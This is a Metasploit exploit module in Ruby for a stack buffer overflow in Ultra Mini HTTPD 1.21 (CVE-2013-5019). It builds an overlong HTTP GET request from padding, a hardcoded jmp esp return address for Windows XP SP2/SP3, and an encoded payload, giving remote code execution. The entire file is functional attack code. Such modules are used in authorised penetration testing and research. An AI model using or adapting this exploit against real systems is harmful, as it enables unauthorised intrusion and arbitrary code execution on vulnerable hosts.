##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Egghunter

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Ultra Mini HTTPD Stack Buffer Overflow",
			'Description'    => %q{
					This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21
				allowing remote attackers to execute arbitrary code via a long resource name in an HTTP
				request.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'superkojiman',  #Discovery, PoC
					'PsychoSpy <neinwechter[at]gmail.com>' #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '95164'],
					['EDB','26739'],
					['CVE','2013-5019'],
					['BID','61130']
				],
			'Payload'        =>
				{
					'Space' => 1623,
					'StackAdjustment' => -3500,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "thread"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'v1.21 - Windows XP SP2 ENG',
						{
							'Offset' => 5412,
							'Ret'=>0x73E32ECF #jmp esp - mfc42.dll
						}
					],
					[
						'v1.21 - Windows XP SP3 ENG',
						{
							'Offset' => 5412,
							'Ret'=>0x7e429353 #jmp esp - user32.dll
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 10 2013'
			))

			register_options(
				[
					OptPort.new('RPORT', [true, 'The remote port', 80])
				], self.class)
	end

	def exploit
		buf = rand_text_alpha(target['Offset'])
		buf << [target.ret].pack("V*")
		buf << payload.encoded

		print_status("Sending buffer...")
		send_request_cgi({
				'method' => 'GET',
				'uri'    => "/#{buf}"
		})
	end
end
